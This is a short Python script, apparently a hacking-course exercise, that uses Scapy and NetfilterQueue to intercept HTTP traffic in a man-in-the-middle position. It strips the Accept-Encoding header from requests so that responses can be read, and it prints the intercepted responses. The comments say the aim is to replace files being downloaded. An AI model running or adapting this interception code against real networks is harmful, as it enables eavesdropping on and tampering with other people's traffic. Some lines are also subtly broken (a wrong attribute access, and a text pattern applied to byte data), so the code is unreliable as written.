#! /home/kali/.pyenv/versions/hacking/bin/python

# Scapy lets us probe, scan or attack networks.
import scapy.all as scapy
# NetfilterQueue provides access to packets matched by an iptables rule in Linux. 
# Packets so matched can be accepted, dropped, altered, or given a mark.
import netfilterqueue
# Regex allow to find patterns in text
import re

from scapy.error import Scapy_Exception

# Function that change the info of a packet
def set_load(packet, load):
    # Set the load of the intercepting packet
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# Function that allow to intercept files that are going to be downloaded and then replace it
def process_packet(packet):
    # Converting packets in scapy packets
    scapy_packet = scapy.IP(packet.get_payload())
    # Check if the packet has a layer Raw
    if scapy_packet.haslayer(scapy.Raw):
        # Check if the packet has HTTP request
        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] Request')
            # We search for a pattern that contain the encoding information in the request and replace it with nothing, allowing us to read the HTTP responses
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)  
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(bytes(new_packet))
        # Check if the TCP layer has 80 in the sport section
        elif scapy_packet[scapy_packet.TCP].sport == 80:
            print('[+] Response')
            print(scapy_packet.show())
                
              
    packet.accept()

# Create a queue for the network traffic to be replaced
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

